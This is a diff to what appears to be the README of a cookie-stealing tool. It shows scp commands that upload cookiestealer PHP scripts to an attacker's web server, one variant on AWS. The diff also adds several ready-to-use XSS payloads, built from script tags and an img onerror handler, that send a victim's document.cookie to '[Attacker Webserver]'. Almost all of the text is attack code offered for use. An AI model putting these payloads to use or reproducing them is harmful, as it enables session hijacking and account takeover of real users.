@@ -26,7 +26,7 @@ sudo scp cookiestealer-simple.php username@AttackMachine:/var/www/html/
 
 sudo scp log.txt username@AttackMachine:/var/www/html/
 
-AWS Version:
+**AWS Version**:
 
 scp -i AWS-Key.pem cookiesteal-simple.php ec2-user@ec2[YOUR IP].us-east-2.compute.amazonaws.com:~/.
 
@@ -34,4 +34,9 @@ sudo mv cookiestealer-simple.php /var/www/html/
 
 Example: http://[Attacker Webserver]/cookiesteal-simple.php
 
-XSS Payload Example: <script javascript:text>document.location="http://[Attacker Webserver]?c=" + document.cookie + "&t=Alert"; </script>
+_XSS Payload Examples_:
+<script javascript:text>document.location="http://[Attacker Webserver]cookiesteal-simple.php?c=" + document.cookie + "&t=Alert"; </script>
+
+<script>document.location='http://[Attacker Webserver]/cookiesteal-v.php?cookie=' + document.cookie</script>
+
+<img src=x onerror=this.src='http://[Attacker Webserver]/cookiesteal-v.php?cookie='+document.cookie>
